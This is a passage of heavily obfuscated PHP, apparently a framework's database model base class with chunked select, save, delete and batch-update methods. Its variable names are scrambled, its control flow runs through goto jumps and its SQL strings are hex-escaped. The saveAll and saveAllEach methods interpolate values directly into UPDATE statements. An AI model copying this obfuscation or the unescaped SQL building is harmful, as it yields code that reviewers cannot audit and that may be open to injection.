$EçÎäéÃÔÑ[197] && array_key_exists($EÖ˜ú∏ªªˆ, $c†‹†¢ÚïÇ)) { if (!$c†‹†¢ÚïÇ[$EÖ˜ú∏ªªˆ]) { unset($c†‹†¢ÚïÇ[$EÖ˜ú∏ªªˆ]); } break; } if (isset($c†‹†¢ÚïÇ[$EÖ˜ú∏ªªˆ])) { array_unshift($dûŸÑï†Ÿ∂, $c†‹†¢ÚïÇ[$EÖ˜ú∏ªªˆ]); } if ($EçÎäéÃÔÑ[319] == $C´«Œ›Âæò[3]) { $c†‹†¢ÚïÇ[$EÖ˜ú∏ªªˆ] = call_user_func_array($däêã»Óé™, $dûŸÑï†Ÿ∂); } else { $c†‹†¢ÚïÇ[$EÖ˜ú∏ªªˆ] = call_user_func_array(array(&$this, $däêã»Óé™), $dûŸÑï†Ÿ∂); } break; case $EçÎäéÃÔÑ[268]: if (isset($c†‹†¢ÚïÇ[$EÖ˜ú∏ªªˆ]) && $c†‹†¢ÚïÇ[$EÖ˜ú∏ªªˆ]) { $c†‹†¢ÚïÇ[$EÖ˜ú∏ªªˆ] = call_user_func_array(array(&$this, $C´«Œ›Âæò[1]), array($c†‹†¢ÚïÇ[$EÖ˜ú∏ªªˆ])); } break; case $EçÎäéÃÔÑ[271]: $c†‹†¢ÚïÇ[$EÖ˜ú∏ªªˆ] = $c†‹†¢ÚïÇ[$C´«Œ›Âæò[1]]; break; case $EçÎäéÃÔÑ[292]: if (isset($c†‹†¢ÚïÇ[$EÖ˜ú∏ªªˆ]) && !is_string($c†‹†¢ÚïÇ[$EÖ˜ú∏ªªˆ])) { $c†‹†¢ÚïÇ[$EÖ˜ú∏ªªˆ] = json_encode_force($c†‹†¢ÚïÇ[$EÖ˜ú∏ªªˆ]); } break; case $EçÎäéÃÔÑ[321]: if ($c†‹†¢ÚïÇ[$EÖ˜ú∏ªªˆ] === $EçÎäéÃÔÑ[33]) { unset($c†‹†¢ÚïÇ[$EÖ˜ú∏ªªˆ]); } break; case $EçÎäéÃÔÑ[322]: $c†‹†¢ÚïÇ[$EÖ˜ú∏ªªˆ] = $C´«Œ›Âæò[1]; default: break; } } if ($e‹ó•Ü‰æ≠ == $EçÎäéÃÔÑ[353]) { $cé‡ûﬁŸ‚É = strtolower($this->db->getDbType()); if (strpos($cé‡ûﬁŸ‚É, $EçÎäéÃÔÑ[9]) !== 0) { return; } $EÎ–Ü√˜›µ = $this->field(!0)->fields; $cè—∂‰˜º™ = $EÎ–Ü√˜›µ[$EçÎäéÃÔÑ[250]]; if (isset($EÎ–Ü√˜›µ[$EçÎäéÃÔÑ[249]])) { unset($cè—∂‰˜º™[$EÎ–Ü√˜›µ[$EçÎäéÃÔÑ[249]]]); } foreach ($cè—∂‰˜º™ as $c£¨ºéÚáÇ => $e‹ó•Ü‰æ≠) { if (!isset($c†‹†¢ÚïÇ[$c£¨ºéÚáÇ])) { $c†‹†¢ÚïÇ[$c£¨ºéÚáÇ] = $EçÎäéÃÔÑ[33]; } } } } private function dataAfterFilter(&$a∆Ë√Âê√π) { $A¿Ùã∏»¨ë =& $_SERVER[’ÿƒ†ïò]; foreach ($this->dataAuto as $d‘±ëˆÀÇØ) { $BøÜÍ≥Áå = $d‘±ëˆÀÇØ[0]; if (!isset($a∆Ë√Âê√π[$BøÜÍ≥Áå])) { continue; } if (!in_array($A¿Ùã∏»¨ë[355], explode($A¿Ùã∏»¨ë[47], $d‘±ëˆÀÇØ[2]))) { continue; } switch (trim($d‘±ëˆÀÇØ[3])) { case $A¿Ùã∏»¨ë[319]: case $A¿Ùã∏»¨ë[320]: $C¬Ÿ…Áîçá = isset($d‘±ëˆÀÇØ[4]) ? (array) $d‘±ëˆÀÇØ[4] : array(); array_unshift($C¬Ÿ…Áîçá, $a∆Ë√Âê√π[$BøÜÍ≥Áå]); if (isset($d‘±ëˆÀÇØ[4]) && $d‘±ëˆÀÇØ[4] == $A¿Ùã∏»¨ë[375]) { $C¬Ÿ…Áîçá = array($a∆Ë√Âê√π[$BøÜÍ≥Áå]); } if ($A¿Ùã∏»¨ë[319] == $d‘±ëˆÀÇØ[3]) { $a∆Ë√Âê√π[$BøÜÍ≥Áå] = call_user_func_array($d‘±ëˆÀÇØ[1], $C¬Ÿ…Áîçá); } else { $a∆Ë√Âê√π[$BøÜÍ≥Áå] = call_user_func_array(array(&$this, $d‘±ëˆÀÇØ[1]), $C¬Ÿ…Áîçá); } break; case $A¿Ùã∏»¨ë[268]: if (isset($a∆Ë√Âê√π[$BøÜÍ≥Áå]) && $a∆Ë√Âê√π[$BøÜÍ≥Áå]) { $a∆Ë√Âê√π[$BøÜÍ≥Áå] = call_user_func_array(array(&$this, $d‘±ëˆÀÇØ[1]), array($a∆Ë√Âê√π[$BøÜÍ≥Áå])); } break; case $A¿Ùã∏»¨ë[271]: $a∆Ë√Âê√π[$BøÜÍ≥Áå] = $a∆Ë√Âê√π[$d‘±ëˆÀÇØ[1]]; break; case $A¿Ùã∏»¨ë[292]: $cÎøíÍáãâ = $a∆Ë√Âê√π[$BøÜÍ≥Áå]; $a∆Ë√Âê√π[$BøÜÍ≥Áå] = json_decode($cÎøíÍáãâ, !0); if (is_null($a∆Ë√Âê√π[$BøÜÍ≥Áå])) { $a∆Ë√Âê√π[$BøÜÍ≥Áå] = $cÎøíÍáãâ; } break; case $A¿Ùã∏»¨ë[321]: if ($a∆Ë√Âê√π[$BøÜÍ≥Áå] === $A¿Ùã∏»¨ë[33]) { unset($a∆Ë√Âê√π[$BøÜÍ≥Áå]); } break; case $A¿Ùã∏»¨ë[322]: $a∆Ë√Âê√π[$BøÜÍ≥Áå] = $d‘±ëˆÀÇØ[1]; break; default: break; } } } public function saveAll($c˜æ“‹¿–Ü) { goto b§éπ√ã»Ó; f‰≠∑•ÂÇú: $this->chunkEventSet(); goto C‚ıàÇ¨Íç; b˜Õª›ºä∂: $EíÊõ¬ŸëÓ = array(); $F‘÷ù¨îÖ≈ = count($c˜æ“‹¿–Ü); for ($C€Á±ﬂúﬂÑ = 0; $C€Á±ﬂúﬂÑ < $F‘÷ù¨îÖ≈; $C€Á±ﬂúﬂÑ++) { $Dÿú⁄’íç≥ = $c˜æ“‹¿–Ü[$C€Á±ﬂúﬂÑ]; if (!is_array($Dÿú⁄’íç≥) || count($Dÿú⁄’íç≥) != 4) { continue; } $bô¨•åŒ∫ñ = "\125\x50\104\x41\x54\105\x20\x60{$eáÜÈÉ€è∞}\x60\x20\x53\x45\x54\x20{$Dÿú⁄’íç≥[2]}\x20\75\x20\x43\101\123\x45\x20{$Dÿú⁄’íç≥[0]}\x20\xa"; if ($Cï„ê·ﬂÙü == 0) { $BÖÂì‚≥„Ø = $bô¨•åŒ∫ñ; } $EíÊõ¬ŸëÓ[] = $EƒÍê⁄ïòÖ[116] . $Dÿú⁄’íç≥[1] . $EƒÍê⁄ïòÖ[116]; $Cï„ê·ﬂÙü++; $BÖÂì‚≥„Ø .= "\40\127\110\105\116\x20\x27{$Dÿú⁄’íç≥[1]}\47\x20\124\110\x45\116\40\47{$Dÿú⁄’íç≥[3]}\47\x20\xa"; if ($Cï„ê·ﬂÙü == $Fœâ™ø›ú∏ || $C€Á±ﬂúﬂÑ == $F‘÷ù¨îÖ≈ - 1) { goto a√Ã®õüÁ; B˘√ñÎ“çõ: $Cï„ê·ﬂÙü = 0; $BÖÂì‚≥„Ø = $bô¨•åŒ∫ñ; $this->chunkEventCheck(count($EíÊõ¬ŸëÓ)); goto b¢∂óﬂÚìŒ; a√Ã®õüÁ: $fµªäÑ˘¥ê = implode($EƒÍê⁄ïòÖ[47], $EíÊõ¬ŸëÓ); $BÖÂì‚≥„Ø .= "\x20\105\116\104\40\40\x57\110\x45\122\x45\x20{$Dÿú⁄’íç≥[0]}\x20\x49\x4e\40\50{$fµªäÑ˘¥ê}\51\40"; $this->execute($BÖÂì‚≥„Ø); goto B˘√ñÎ“çõ; b¢∂óﬂÚìŒ: $EíÊõ¬ŸëÓ = array(); goto c¢∑Ü»é‹ç; c¢∑Ü»é‹ç: } } goto f‰≠∑•ÂÇú; b§éπ√ã»Ó: $EƒÍê⁄ïòÖ =& $_SERVER[’ÿƒ†ïò]; $eáÜÈÉ€è∞ = $this->tablePrefix . $this->tableName; $Fœâ™ø›ú∏ = self::SQL_WHERE_IN_CHUNK; goto EΩÓ˜∫çÎú; EΩÓ˜∫çÎú: $c˜æ“‹¿–Ü = is_array($c˜æ“‹¿–Ü) ? $c˜æ“‹¿–Ü : array(); $BÖÂì‚≥„Ø = $EƒÍê⁄ïòÖ[376]; $Cï„ê·ﬂÙü = 0; goto b˜Õª›ºä∂; C‚ıàÇ¨Íç: } public function saveAllEach($B¡ﬂ“éÃÈ) { $E∏åÕ¨å–π =& $_SERVER[’ÿƒ†ïò]; $eÎÂ≥¬ﬂã™ = $this->tablePrefix . $this->tableName; foreach ($B¡ﬂ“éÃÈ as $b€ﬂÿëÉ∏ˆ) { if (!is_array($b€ﬂÿëÉ∏ˆ) || count($b€ﬂÿëÉ∏ˆ) != 4) { continue; } $b†√ò…“∏à = $b€ﬂÿëÉ∏ˆ[0] . $E∏åÕ¨å–π[377] . $b€ﬂÿëÉ∏ˆ[1] . $E∏åÕ¨å–π[116]; $A ó£»¶Éî = $b€ﬂÿëÉ∏ˆ[2] . $E∏åÕ¨å–π[377] . $b€ﬂÿëÉ∏ˆ[3] . $E∏åÕ¨å–π[116]; $bÈÕ¨ÿ™‹„ = "\x75\160\x64\141\x74\145\40{$eÎÂ≥¬ﬂã™}\40\163\145\164\40{$A ó£»¶Éî}\x20\x77\150\x65\x72\145\40{$b†√ò…“∏à}\73"; $this->execute($bÈÕ¨ÿ™‹„); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($F˜‡ß∑≤£ı = false, $C£âØÓ÷Ü‡ = false) { $this->_chunkEvent = $F˜‡ß∑≤£ı; $this->_chunkEventParam = $C£âØÓ÷Ü‡; } private function chunkEventCheck($c•ÕΩ˜°Ñ´) { if (!$this->_chunkEvent) { return; } $b‚ÈâŸÜ≈Ö = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $b‚ÈâŸÜ≈Ö[$_SERVER[’ÿƒ†ïò][378]] = $c•ÕΩ˜°Ñ´; Hook::trigger($this->_chunkEvent, $b‚ÈâŸÜ≈Ö); } public function addAll($b†Œø«≥•Ù, $f†™ºÃ§¢î = array(), $aÛ⁄€’˘ÌÑ = false) { goto CøãâŸß∞µ; E”‡¥éë™«: if (empty($b†Œø«≥•Ù)) { $this->error = think_lang($FÕÕÇîâ››[269]); return !1; } $f†™ºÃ§¢î = $this->_parseOptions($f†™ºÃ§¢î); foreach ($b†Œø«≥•Ù as $EÖ‰á–„√∑ => $dÜ·ó™ß÷Ô) { $b†Œø«≥•Ù[$EÖ‰á–„√∑] = $this->_facade($dÜ·ó™ß÷Ô); $this->_beforeInsert($b†Œø«≥•Ù[$EÖ‰á–„√∑], $f†™ºÃ§¢î); } goto eÇæçﬂâëÍ; eÇæçﬂâëÍ: if (method_exists($this->db, $FÕÕÇîâ››[270])) { for ($Cëº≥ò”µ÷ = 0; $Cëº≥ò”µ÷ < count($b†Œø«≥•Ù); $Cëº≥ò”µ÷ += $c“âÖÿ„Î‰) { $E€çë¨Ìñ  = array_slice($b†Œø«≥•Ù, $Cëº≥ò”µ÷, $c“âÖÿ„Î‰); if (!is_array($E€çë¨Ìñ ) || count($E€çë¨Ìñ ) == 0) { break; } $aíªÛ∏ñàî = $this->db->insertAll($E€çë¨Ìñ , $f†™ºÃ§¢î, $aÛ⁄€’˘ÌÑ); $this->chunkEventCheck(count($E€çë¨Ìñ )); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($b†Œø«≥•Ù as $EÖ‰á–„√∑ => $dÜ·ó™ß÷Ô) { $aíªÛ∏ñàî = $this->db->insert($dÜ·ó™ß÷Ô, $f†™ºÃ§¢î, $aÛ⁄€’˘ÌÑ); } $this->commit(); } if (!1 !== $aíªÛ∏ñàî) { $c´¢Ÿ¬”∑‰ = $this->getLastInsID(); if ($c´¢Ÿ¬”∑‰) { return $c´¢Ÿ¬”∑‰; } } return $aíªÛ∏ñàî; goto aÃ¶ø‹¯â÷; CøãâŸß∞µ: $FÕÕÇîâ›› =& $_SERVER[’ÿƒ†ïò]; ignore_timeout(); $c“âÖÿ„Î‰ = self::SQL_WHERE_IN_CHUNK; goto E”‡¥éë™«; aÃ¶ø‹¯â÷: } public function save($eÒªêˆû†Ù = '', $D⁄°ÜºÁ‹÷ = array()) { goto féÎïí√Ë”; féÎïí√Ë”: $eÆÙÈ√≈®ç =& $_SERVER[’ÿƒ†ïò]; $C“«›¥ÿô¿ = self::SQL_WHERE_IN_CHUNK; $FıˆﬁÖ≠∞— = $this->optionsValue(); goto BêÎ‚£ﬂú“; dò…ôˆåÀñ: $a“¡∫æ∞É˜ = $FıˆﬁÖ≠∞—[$eÆÙÈ√≈®ç[273]][$E©∑Óñ®ï”][1]; $a“¡∫æ∞É˜ = is_array($a“¡∫æ∞É˜) ? $a“¡∫æ∞É˜ : array(); $Dæ∂ØèíÕ¶ = count($a“¡∫æ∞É˜); goto dü®Ø¿›µµ; dü®Ø¿›µµ: for ($BÔπ’‹§Ç• = 0; $BÔπ’‹§Ç• < $Dæ∂ØèíÕ¶; $BÔπ’‹§Ç• += $C“«›¥ÿô¿) { $dô¬é´€®£ = array_slice($a“¡∫æ∞É˜, $BÔπ’‹§Ç•, $C“«›¥ÿô¿); if (!is_array($dô¬é´€®£) || count($dô¬é´€®£) == 0) { break; } $FıˆﬁÖ≠∞—[$eÆÙÈ√≈®ç[273]][$E©∑Óñ®ï”][1] = $dô¬é´€®£; $this->optionsValue($FıˆﬁÖ≠∞—); $b∆È¿∑«¬ë += parent::save($eÒªêˆû†Ù, $D⁄°ÜºÁ‹÷); $this->chunkEventCheck(count($dô¬é´€®£)); } $this->chunkEventSet(); return $b∆È¿∑«¬ë; goto Aí°Í∞ˆ⁄è; BêÎ‚£ﬂú“: $E©∑Óñ®ï” = $this->findWhereField($FıˆﬁÖ≠∞—); if (!$E©∑Óñ®ï”) { return parent::save($eÒªêˆû†Ù, $D⁄°ÜºÁ‹÷); } $b∆È¿∑«¬ë = 0; goto dò…ôˆåÀñ; Aí°Í∞ˆ⁄è: } public function add($FÍó¥†◊ºÂ = '', $Då˘ÎÃ©õØ = array(), $E≥¥ÿçË‡Æ = false) { if ($this->addTaskStatus && is_array($FÍó¥†◊ºÂ)) { $this->addTaskData[] = $FÍó¥†◊ºÂ; return; } return parent::add($FÍó¥†◊ºÂ, $Då˘ÎÃ©õØ, $E≥¥ÿçË‡Æ); } public function parseWhereLike($AÔΩ™ë√∑¯, $cáÁƒéîúí = '', $bóµ©ÍËëØ = false, &$Fûñ√„¿ÇÍ = false) { goto a¡çﬂªòÉì; a¡çﬂªòÉì: $FÏæ£”ÈÍ• =& $_SERVER[’ÿƒ†ïò]; $cË ‡Œ÷Ñ° = $GLOBALS[$FÏæ£”ÈÍ•[6]][$FÏæ£”ÈÍ•[379]]; if (!$cË ‡Œ÷Ñ°[$FÏæ£”ÈÍ•[380]]) { return $AÔΩ™ë√∑¯; } goto EÆ◊¯– ÉÁ; EÆ◊¯– ÉÁ: if (!is_array($AÔΩ™ë√∑¯)) { return $AÔΩ™ë√∑¯; } $E ¨Ñª ç¨ = array(); $AΩèäô¡ÂÒ = 0; goto D°ÆŸ”≥œÑ; D°ÆŸ”≥œÑ: foreach ($AÔΩ™ë√∑¯ as $cá¶≠˜€¯Â => $Bàà«äÇ¥À) { if (is_array($Bàà«äÇ¥À) && count($Bàà«äÇ¥À) == 2 && $Bàà«äÇ¥À[0] == $FÏæ£”ÈÍ•[381] && is_string($Bàà«äÇ¥À[1]) && substr($Bàà«äÇ¥À[1], 0, 1) == $FÏæ£”ÈÍ•[382] && substr($Bàà«äÇ¥À[1], strlen($Bàà«äÇ¥À[1]) - 1, 1) == $FÏæ£”ÈÍ•[382]) { goto F¿ÃÙÙƒçÚ; Cº≈†∂ÙÎÛ: if ($cË ‡Œ÷Ñ°[$FÏæ£”ÈÍ•[384]]) { $Aö§†§ûæ“ = $FÏæ£”ÈÍ•[385] . $fëô∂«˘ªº . $FÏæ£”ÈÍ•[386]; if ($cË ‡Œ÷Ñ°[$FÏæ£”ÈÍ•[387]]) { $Aö§†§ûæ“ = $FÏæ£”ÈÍ•[386] . $fëô∂«˘ªº . $FÏæ£”ÈÍ•[385]; } } $E ¨Ñª ç¨[$AΩèäô¡ÂÒ] = $FÏæ£”ÈÍ•[388] . $eÍÏâ¶ä∆í . $FÏæ£”ÈÍ•[389] . $Aö§†§ûæ“ . $FÏæ£”ÈÍ•[390]; $AΩèäô¡ÂÒ++; goto fıñöéˆƒ†; Bàˆ†‰ÑÇ≥: $fëô∂«˘ªº = $this->db->escapeString($fëô∂«˘ªº); if (!strpos($eÍÏâ¶ä∆í, $FÏæ£”ÈÍ•[95])) { $eÍÏâ¶ä∆í = $FÏæ£”ÈÍ•[383] . $eÍÏâ¶ä∆í . $FÏæ£”ÈÍ•[383]; } $Aö§†§ûæ“ = $FÏæ£”ÈÍ•[182] . $fëô∂«˘ªº . $FÏæ£”ÈÍ•[182]; goto Cº≈†∂ÙÎÛ; fıñöéˆƒ†: continue; goto Fìã¯È”À—; F¿ÃÙÙƒçÚ: $Fûñ√„¿ÇÍ = !0; $eÍÏâ¶ä∆í = is_string($cá¶≠˜€¯Â) ? $cá¶≠˜€¯Â : $cáÁƒéîúí; $fëô∂«˘ªº = substr($Bàà«äÇ¥À[1], 1, strlen($Bàà«äÇ¥À[1]) - 2); goto Bàˆ†‰ÑÇ≥; Fìã¯È”À—: } if (is_array($Bàà«äÇ¥À)) { $cáÁƒéîúí = is_string($cá¶≠˜€¯Â) ? $cá¶≠˜€¯Â : $cáÁƒéîúí; $Bàà«äÇ¥À = $this->parseWhereLike($Bàà«äÇ¥À, $cáÁƒéîúí, !0, $Fûñ√„¿ÇÍ); } if (is_numeric($cá¶≠˜€¯Â)) { $E ¨Ñª ç¨[$AΩèäô¡ÂÒ] = $Bàà«äÇ¥À; $AΩèäô¡ÂÒ++; } else { $E ¨Ñª ç¨[$cá¶≠˜€¯Â] = $Bàà«äÇ¥À; } } if ($Fûñ√„¿ÇÍ && !$bóµ©ÍËëØ) { } return $E ¨Ñª ç¨; goto E∫…ÈÇŸâ∫; E∫…ÈÇŸâ∫: } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($BÈ˜∫¶∆∂„ = array()) { goto b·œí’ Öá; c¨ß≤ §µå: $d≠™ô¶»ìë = $this->findWhereField($bóÛºˆÆ’ß); if (!$d≠™ô¶»ìë || isset($bóÛºˆÆ’ß[$cÑÜ¶“èè®[290]]) || isset($bóÛºˆÆ’ß[$cÑÜ¶“èè®[351]])) { return parent::select($BÈ˜∫¶∆∂„); } $C¡Ûµõ”ÜÑ = $bóÛºˆÆ’ß[$cÑÜ¶“èè®[273]][$d≠™ô¶»ìë][1]; goto EÒ†£áªãﬂ; b·œí’ Öá: $cÑÜ¶“èè® =& $_SERVER[’ÿƒ†ïò]; $bƒÊ®—¯áã = self::SQL_WHERE_IN_CHUNK; $bóÛºˆÆ’ß = $this->optionsValue(); goto c¨ß≤ §µå; EÒ†£áªãﬂ: $C¡Ûµõ”ÜÑ = is_array($C¡Ûµõ”ÜÑ) ? $C¡Ûµõ”ÜÑ : array(); $cÔ÷ãØÿÖË = null; for ($eÈ∫¿√Ìñœ = 0; $eÈ∫¿√Ìñœ < count($C¡Ûµõ”ÜÑ); $eÈ∫¿√Ìñœ += $bƒÊ®—¯áã) { $b˜††â¥ÎÏ = array_slice($C¡Ûµõ”ÜÑ, $eÈ∫¿√Ìñœ, $bƒÊ®—¯áã); if (!is_array($b˜††â¥ÎÏ) || count($b˜††â¥ÎÏ) == 0) { break; } $bóÛºˆÆ’ß[$cÑÜ¶“èè®[273]][$d≠™ô¶»ìë][1] = $b˜††â¥ÎÏ; $this->optionsValue($bóÛºˆÆ’ß); $aö≥ñÁî∂— = parent::select($BÈ˜∫¶∆∂„); if (!$aö≥ñÁî∂—) { continue; } $cÔ÷ãØÿÖË = is_array($cÔ÷ãØÿÖË) ? $cÔ÷ãØÿÖË : array(); $cÔ÷ãØÿÖË = array_merge($cÔ÷ãØÿÖË, $aö≥ñÁî∂—); } goto b›§ÛöùéÁ; b›§ÛöùéÁ: return $cÔ÷ãØÿÖË; goto eø⁄á»ëË›; eø⁄á»ëË›: } public function delete($E≈Ûö˜∏ ò = array()) { goto DÉﬂ”‘≤ê¢; EàÉ©≠ùÆ¨: return $Eòº™ù„¯Ò; goto aÇ®˘Ã€≈ ; a‘àäç≈èË: $då⁄Ë£ﬂß≤ = $this->findWhereField($fé¥ÃÑ·⁄®); if (!$då⁄Ë£ﬂß≤) { return parent::delete($E≈Ûö˜∏ ò); } $Eòº™ù„¯Ò = 0; goto fµèé€Ï¡; DÉﬂ”‘≤ê¢: $fµ≤≠œ›ÑÇ =& $_SERVER[’ÿƒ†ïò]; $dîÒ«˘Ñ∑ = self::SQL_WHERE_IN_CHUNK; $fé¥ÃÑ·⁄® = $this->optionsValue(); goto a‘àäç≈èË; fµèé€Ï¡: $fúÌÈãêÔì = $fé¥ÃÑ·⁄®[$fµ≤≠œ›ÑÇ[273]][$då⁄Ë£ﬂß≤][1]; $fúÌÈãêÔì = is_array($fúÌÈãêÔì) ? $fúÌÈãêÔì : array(); for ($c¥ç™ÓÀœ§ = 0; $c¥ç™ÓÀœ§ < count($fúÌÈãêÔì); $c¥ç™ÓÀœ§ += $dîÒ«˘Ñ∑) { $fäó«›Ûµà = array_slice($fúÌÈãêÔì, $c¥ç™ÓÀœ§, $dîÒ«˘Ñ∑); if (!is_array($fäó«›Ûµà) || count($fäó«›Ûµà) == 0) { break; } $fé¥ÃÑ·⁄®[$fµ≤≠œ›ÑÇ[273]][$då⁄Ë£ﬂß≤][1] = $fäó«›Ûµà; $this->optionsValue($fé¥ÃÑ·⁄®); $Eòº™ù„¯Ò += parent::delete($E≈Ûö˜∏ ò); } goto EàÉ©≠ùÆ¨; aÇ®˘Ã€≈ : } private function findWhereField($D∑™Ü∫òõè) { $aÜœäÁ¥¢Ê =& $_SERVER[’ÿƒ†ïò]; $b¶âÿπø∏Æ = self::SQL_WHERE_IN_CHUNK; if (!is_array($D∑™Ü∫òõè) || !is_array($D∑™Ü∫òõè[$aÜœäÁ¥¢Ê[273]])) { return !1; } foreach ($D∑™Ü∫òõè[$aÜœäÁ¥¢Ê[273]] as $Dèú∆íÂÏã => $d¡â∏…∞ç›) { if (is_array($d¡â∏…∞ç›) && isset($d¡â∏…∞ç›[0]) && is_string($d¡â∏…∞ç›[0]) && strtolower($d¡â∏…∞ç›[0]) == $aÜœäÁ¥¢Ê[7] && is_array($d¡â∏…∞ç›[1]) && count($d¡â∏…∞ç›[1]) > $b¶âÿπø∏Æ) { ignore_timeout(); return $Dèú∆íÂÏã; } } return !1; } public function setMasterDB($F±ØËè∂∞˜ = true) { think_config($_SERVER[’ÿƒ†ïò][391], $F±ØËè∂∞˜); } } class ModelBaseLight { public $optionType = ''; public $modelType = "\x53\x79\x73\x74\x65\155\x4f\x70\164\151\157\156"; public $field = array(); public function listData($FÂ€ñ€µÒœ = false, $A€ùÃèä¢é = "\155\x6f\144\151\x66\171\124\151\x6d\x65", $f§◊ë∆Öœº = false) { $dÔ¨–“ﬁ´˜ = Model($this->modelType)->get(!1, $this->optionType, !0); $EÁŒπﬂ‰∏π = array_values($dÔ¨–“ﬁ´˜); if ($EÁŒπﬂ‰∏π && $EÁŒπﬂ‰∏π[0] && !is_array($EÁŒπﬂ‰∏π[0])) { Model($this->modelType)->cacheRemove($this->optionType); $dÔ¨–“ﬁ´˜ = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$dÔ¨–“ﬁ´˜) { return $FÂ€ñ€µÒœ ? null : array(); } if (!$FÂ€ñ€µÒœ) { $dÔ¨–“ﬁ´˜ = array_filter(array_values($dÔ¨–“ﬁ´˜)); return array_sort_by($dÔ¨–“ﬁ´˜, $A€ùÃèä¢é, $f§◊ë∆Öœº); } return $dÔ¨–“ﬁ´˜[$_SERVER[’ÿƒ†ïò][392] . $FÂ€ñ€µÒœ]; } public function insert($f›≤ëèÌè) { goto C≤â≈øïﬂõ; DäøûÌåË¶: $D‰©√∂∫µ¨ = $D‰©√∂∫µ¨ ? $D‰©√∂∫µ¨ : 0; $f›≤ëèÌè[$dËÿ§¢ªà™[395]] = ++$D‰©√∂∫µ¨; $f›≤ëèÌè[$dËÿ§¢ªà™[194]] = time(); goto aÎìçãµ∑ã; A´§‚›ôÍ«: return $D‰©√∂∫µ¨; goto EœÉò‰ó´÷; C≤â≈øïﬂõ: $dËÿ§¢ªà™ =& $_SERVER[’ÿƒ†ïò]; $f›≤ëèÌè = array_field_key($f›≤ëèÌè, $this->field); $D‰©√∂∫µ¨ = Model($this->modelType)->get($dËÿ§¢ªà™[393], $this->optionType . $dËÿ§¢ªà™[394]); goto DäøûÌåË¶; aÎìçãµ∑ã: $f›≤ëèÌè[$dËÿ§¢ªà™[84]] = time(); Model($this->modelType)->set($dËÿ§¢ªà™[393], $D‰©√∂∫µ¨, $this->optionType . $dËÿ§¢ªà™[394]); Model($this->modelType)->set($dËÿ§¢ªà™[392] . $D‰©√∂∫µ¨, $f›≤ëèÌè, $this->optionType); goto A´§‚›ôÍ«; EœÉò‰ó´÷: } public function update($cÑùã» ≥á, $BﬁÙÑìä È) { goto D‹◊†÷œ÷í; c´è°óò÷: if (!$FÜù¬èí«Ù || !$cÑùã» ≥á) { return !1; } $BﬁÙÑìä È = array_merge($FÜù¬èí«Ù, $BﬁÙÑìä È); $BﬁÙÑìä È[$aÖ≥æÛÀß√[84]] = time(); goto EäºÔ∂åàë; EäºÔ∂åàë: return Model($this->modelType)->set($aÖ≥æÛÀß√[392] . $cÑùã» ≥á, $BﬁÙÑìä È, $this->optionType); goto D ˜ÒÑÙãÊ; D‹◊†÷œ÷í: $aÖ≥æÛÀß√ =& $_SERVER[’ÿƒ†ïò]; $BﬁÙÑìä È = array_field_key($BﬁÙÑìä È, $this->field); $FÜù¬èí«Ù = $this->listData($cÑùã» ≥á); goto c´è°óò÷; D ˜ÒÑÙãÊ: } public function remove($e«É»ﬂìŸù) { if (!$e«É»ﬂìŸù) { return !1; } return Model($this->modelType)->remove($_SERVER[’ÿƒ†ïò][392] . $e«É»ﬂìŸù, $this->optionType); } public function clear() { $bÖØ‰Ãé∫ =& $_SERVER[’ÿƒ†ïò]; Model($this->modelType)->remove($bÖØ‰Ãé∫[393], $this->optionType . $bÖØ‰Ãé∫[394]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($A••Õ‹û©Ÿ, $FƒñÖÖäü©) { if (!$FƒñÖÖäü©) { return !1; } $e∫∑Íï∆ªı = $this->listData(); $e∫∑Íï∆ªı = array_to_keyvalue($e∫∑Íï∆ªı, $A••Õ‹û©Ÿ); return isset($e∫∑Íï∆ªı[$FƒñÖÖäü©]) ? $e∫∑Íï∆ªı[$FƒñÖÖäü©] : !1; } public function findByName($b≠ÍÎÓéµ”) { return $this->findByKey($_SERVER[’ÿƒ†ïò][28], $b≠ÍÎÓéµ”); } protected function resetData($E„Œ°Ø·£—) { $d∏ÓÌÏãüÈ =& $_SERVER[’ÿƒ†ïò]; $E„Œ°Ø·£— = is_array($E„Œ°Ø·£—) ? $E„Œ°Ø·£— : array(); $Dôø‹–âæÒ = array(); for ($e„œÀ¯≠ôè = 0; $e„œÀ¯≠ôè < count($E„Œ°Ø·£—); $e„œÀ¯≠ôè++) { $Dôø‹–âæÒ[$d∏ÓÌÏãüÈ[392] . $E„Œ°Ø·£—[$e„œÀ¯≠ôè][$d∏ÓÌÏãüÈ[395]]] = $E„Œ°Ø·£—[$e„œÀ¯≠ôè]; } return Model($this->modelType)->set($Dôø‹–âæÒ, !1, $this->optionType); } private function getAutoName($fﬁ¬ÖÃÀ·î) { $B®¿ò™Î’© = array_to_keyvalue($this->listData(), $_SERVER[’ÿƒ†ïò][28]); if (!$B®¿ò™Î’© || !isset($B®¿ò™Î’©[$fﬁ¬ÖÃÀ·î])) { return $fﬁ¬ÖÃÀ·î; } for ($c“™«éÿµı = 1; $c“™«éÿµı < count($B®¿ò™Î’©); $c“™«éÿµı++) { $Eå…èéãŒ´ = $fﬁ¬ÖÃÀ·î . "\x28{$c“™«éÿµı}\51"; if (!isset($B®¿ò™Î’©[$Eå…èéãŒ´])) { return $Eå…èéãŒ´; } } return $Eå…èéãŒ´; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($FöêÍ•¨≤„ = false, $BÑÙÍêÑíÃ = '', $FËïÖÒ¥≠ﬁ = false) { goto BÕ¬ìµÇàá; BÕ¬ìµÇàá: $bäúâö∏‡™ =& $_SERVER[’ÿƒ†ïò]; $BúÜ…ÜÂŸä = $this->cacheGet($BÑÙÍêÑíÃ); $aé©ï£Ï°¬ = $this->optionDefault($BÑÙÍêÑíÃ); goto D∏û∏ﬂ≈áÒ; fìèˆÀ≥ôÈ: $BúÜ…ÜÂŸä = $this->where($AüÏõƒ»åÁ)->select(); $BúÜ…ÜÂŸä = array_to_keyvalue($BúÜ…ÜÂŸä, $bäúâö∏‡™[93], $bäúâö∏‡™[372]); foreach ($BúÜ…ÜÂŸä as 